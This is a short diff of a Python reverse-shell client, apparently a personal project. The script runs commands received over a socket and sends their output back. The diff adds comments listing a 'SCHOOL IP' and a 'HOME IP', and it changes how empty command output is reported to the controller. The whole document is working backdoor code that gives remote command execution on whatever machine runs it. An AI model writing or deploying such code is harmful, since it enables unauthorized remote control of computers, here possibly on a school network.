@@ -4,6 +4,8 @@ import socket
 import subprocess
 import os
 
+# SCHOOL IP: 192.168.210.158
+# HOME IP: 192.168.0.228
 
 #varviables
 IP = "192.168.0.228"
@@ -21,5 +23,8 @@ while True:
   if command.lower() == "exit":
     print("[!] Exited...")
     sys.exit()
-  s.send(output.encode())
+  elif (output == "") or (output == "\n"):
+    s.send("Nothing to output...".encode())
+  else:
+    s.send(output.encode())
 
